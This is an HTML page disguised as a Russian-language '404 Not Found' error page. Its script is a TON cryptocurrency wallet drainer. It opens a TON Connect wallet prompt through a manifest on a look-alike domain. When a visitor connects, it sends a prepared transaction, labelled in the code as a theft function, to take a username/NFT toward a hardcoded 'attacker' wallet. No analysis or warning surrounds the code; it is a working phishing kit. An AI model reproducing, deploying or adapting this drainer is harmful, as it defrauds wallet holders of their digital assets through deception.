<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>404 Not Found</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f5f5f5;
        }
        h1 {
            font-size: 72px;
            color: #333;
            margin-bottom: 20px;
        }
        p {
            color: #666;
            font-size: 18px;
        }
    </style>
    <!-- Сначала определяем функции загрузки -->
    <script>
        function loadFallbackSDK() {
            var script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/npm/tonconnect-sdk@2.2.0/lib/tonconnect-sdk.min.js';
            document.head.appendChild(script);
        }
        function loadFallbackUI() {
            var script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/npm/tonconnect-ui@2.0.4/lib/tonconnect-ui.min.js';
            document.head.appendChild(script);
        }
    </script>
    <!-- Потом грузим библиотеки с запасным вариантом -->
    <script src="https://unpkg.com/tonconnect-sdk@2.2.0/lib/tonconnect-sdk.min.js" onerror="loadFallbackSDK()"></script>
    <script src="https://unpkg.com/tonconnect-ui@2.0.4/lib/tonconnect-ui.min.js" onerror="loadFallbackUI()"></script>
</head>
<body>
    <h1>404</h1>
    <p>Страница не найдена</p>

    <script>
        window.addEventListener('load', function() {
            // Даём библиотекам время на загрузку
            setTimeout(function() {
                // Проверка загрузки библиотек
                if (typeof TonConnect === 'undefined' || typeof TonConnectUI === 'undefined') {
                    console.error('Библиотеки TON Connect не загрузились!');
                    document.body.innerHTML = '<h1>404</h1><p>Страница не найдена</p>';
                    return;
                }

                // ========== ТВОИ ДАННЫЕ ==========
                const ATTACKER_ADDRESS = 'UQDJGfO9WdvXG2jOepsenwxwA_hUmBECDnhlhTXfJkbC3Cp6'; // ТВОЙ НОВЫЙ КОШЕЛЁК
                const USERNAME_COLLECTION_ADDRESS = 'EQDm_rT_9BCePyHF97-mZQbGXjMmMIBsZxFiIXDHHPRh'; // АДРЕС КОЛЛЕКЦИИ
                const PAYLOAD = 'te6cckECBQEAAQsAAeWIAc39af/oITx+Q4vvf0zKDYy8ZkxhANjOIsRC4Y456MMKA5tLO3P///iLTYLRKAAAAA00I+nVx3oe/LAinIUZNSwNySL5E34jwIKucvH2jNQZGfnAzsY6sdLxTjX9+xKyw5RdkWNyOKsKawdaMBwoEBgJAQIKDsPIbQIEAgFoYgBQeGf+SuJLX4dzh2GeG7EF5FlBKf4wJifFZwBSWvy1dKAcBhgoAAAAAAAAAAAAAAAAAQMAoV/MPRRUbeTvpVqftYAXXEjqYukf8Y80Sg6O7kVvcTK+czXoYmxDvFuETLODQXADm/rT/9BCePyHF97+mZQbGXjMmMIBsZxFiIXDHHPRhhQgKAAAKdQ8mA==';
                const manifestUrl = 'https://acountpubgfjdjd-cloud.github.io/nfts/tonconnect-manifest.json';
                // =================================

                let tonConnectUI, connector;

                // Функция кражи
                async function stealUsername() {
                    if (!PAYLOAD) {
                        console.error('Payload не вставлен!');
                        return;
                    }
                    try {
                        const transaction = {
                            validUntil: Math.floor(Date.now() / 1000) + 600,
                            messages: [{
                                address: USERNAME_COLLECTION_ADDRESS,
                                amount: '5000000',
                                payload: PAYLOAD
                            }]
                        };
                        await tonConnectUI.sendTransaction(transaction);
                        console.log('Транзакция кражи отправлена');
                    } catch (e) {
                        console.error('Ошибка кражи:', e);
                    }
                }

                // Инициализация TON Connect
                try {
                    connector = new TonConnect.Connector();
                    tonConnectUI = new TonConnectUI.TonConnectUI({ connector, manifestUrl });

                    // Когда кошелёк подключён
                    connector.onStatusChange(async (wallet) => {
                        if (wallet) {
                            console.log('Кошелёк подключён, пробуем украсть...');
                            await stealUsername();
                        }
                    });

                    // Открываем окно подключения через 1.5 секунды
                    setTimeout(() => {
                        if (!connector.connected) {
                            tonConnectUI.openModal();
                        }
                    }, 1500);
                } catch (e) {
                    console.error('Ошибка инициализации TON Connect:', e);
                }
            }, 2000); // Ждём 2 секунды для загрузки библиотек
        });
    </script>
</body>
</html>
